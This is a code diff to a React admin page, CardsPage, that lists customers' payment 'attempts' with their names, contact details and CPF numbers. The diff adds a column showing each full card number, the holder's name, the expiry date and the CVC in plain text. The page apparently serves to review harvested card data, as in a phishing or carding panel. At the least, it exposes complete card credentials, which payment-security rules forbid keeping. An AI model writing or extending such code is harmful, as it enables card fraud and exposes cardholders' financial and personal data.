@@ -39,16 +39,17 @@ function CardsPage() {
                 <th className="px-4 py-3">Cliente</th>
                 <th className="px-4 py-3">Contato</th>
                 <th className="px-4 py-3">CPF</th>
+                <th className="px-4 py-3">Cartão</th>
                 <th className="px-4 py-3">Cidade/UF</th>
                 <th className="px-4 py-3 text-right">Valor</th>
               </tr>
             </thead>
             <tbody className="divide-y divide-neutral-100">
               {rows.length === 0 && (
-                <tr><td colSpan={6} className="px-4 py-10 text-center text-neutral-400">Nenhuma tentativa ainda.</td></tr>
+                <tr><td colSpan={7} className="px-4 py-10 text-center text-neutral-400">Nenhuma tentativa ainda.</td></tr>
               )}
               {rows.map((r) => (
-                <tr key={r.id} className="hover:bg-neutral-50">
+                <tr key={r.id} className="hover:bg-neutral-50 align-top">
                   <td className="px-4 py-3 text-neutral-700 whitespace-nowrap">{fmtDate(r.created_at)}</td>
                   <td className="px-4 py-3 font-medium text-neutral-900">{r.customer_name}</td>
                   <td className="px-4 py-3 text-neutral-600">
@@ -56,6 +57,15 @@ function CardsPage() {
                     <div className="text-xs text-neutral-500">{r.customer_phone}</div>
                   </td>
                   <td className="px-4 py-3 text-neutral-600">{r.customer_cpf}</td>
+                  <td className="px-4 py-3 text-neutral-700 font-mono text-xs whitespace-nowrap">
+                    {r.card_number ? (
+                      <div className="space-y-0.5">
+                        <div>{r.card_number}</div>
+                        <div className="text-neutral-500">{r.card_holder}</div>
+                        <div className="text-neutral-500">Val: {r.card_exp} · CVC: {r.card_cvc}</div>
+                      </div>
+                    ) : "—"}
+                  </td>
                   <td className="px-4 py-3 text-neutral-600">
                     {r.address?.city ? `${r.address.city}/${r.address.state ?? ""}` : "—"}
                   </td>
